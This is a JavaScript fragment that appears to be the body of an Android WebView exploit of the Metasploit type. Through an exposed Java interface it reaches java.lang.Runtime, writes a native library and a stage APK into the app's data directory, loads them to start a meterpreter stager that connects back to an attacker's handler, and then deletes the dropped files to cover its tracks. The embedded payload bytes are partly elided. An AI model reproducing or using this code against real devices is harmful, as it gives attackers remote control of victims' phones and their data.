 function exec(runtime, cmdArr) {
        var ch = 0;
        var output = '';
        var process = runtime.exec(cmdArr);
        var input = process.getInputStream();

        while ((ch = input.read()) > 0) { output += String.fromCharCode(ch); }
        return output;
      }

      function attemptExploit(obj) {
        // ensure that the object contains a native interface
        try { obj.getClass().forName('java.lang.Runtime'); } catch(e) { return; }

        // get the pid
        var pid = obj.getClass()
                     .forName('android.os.Process')
                     .getMethod('myPid', null)
                     .invoke(null, null);

        // get the runtime so we can exec
        var runtime = obj.getClass()
                         .forName('java.lang.Runtime')
                         .getMethod('getRuntime', null)
                         .invoke(null, null);

        // libraryData contains the bytes for a native shared object built via NDK
        // which will load the "stage", which in this case is our android meterpreter stager.
        var libraryData = "\\0177\\0105\\0114\\0106\\01\\01\\01\\00\\00 .... code missed out here ...   \00";

        // the stageData is the JVM bytecode that is loaded by the NDK stager. It contains
        // another stager which loads android meterpreter from the msf handler.
        var stageData = "\\0120\\0113\\03\\04\\024\\00\\00\\00\\010\\00\    ... code missed out here ...    \\00\\00";

        // get the process name, which will give us our data path
        // $PPID does not seem to work on android 4.0, so we concat pids manually
        var path = '/data/data/' + exec(runtime, ['/system/bin/sh', '-c', 'cat /proc/'+pid.toString()+'/cmdline']);

        var libraryPath = path + '/libunatXPSZ.so';
        var stagePath = path + '/MCVuy.apk';

        // build the library and chmod it
        runtime.exec(['/system/bin/sh', '-c', 'echo -e "'+libraryData+'" > '+libraryPath]).waitFor();
        runtime.exec(['chmod', '700', libraryPath]).waitFor();

        // build the stage, chmod it, and load it
        runtime.exec(['/system/bin/sh', '-c', 'echo -e "'+stageData+'" > '+stagePath]).waitFor();
        runtime.exec(['chmod', '700', stagePath]).waitFor();

        // load the library
        runtime.load(libraryPath);

        // delete dropped files
        runtime.exec(['rm', stagePath]).waitFor();
        runtime.exec(['rm', libraryPath]).waitFor();

        return true;
      }

      for (i in top) { if (attemptExploit(top[i]) === true) break; }
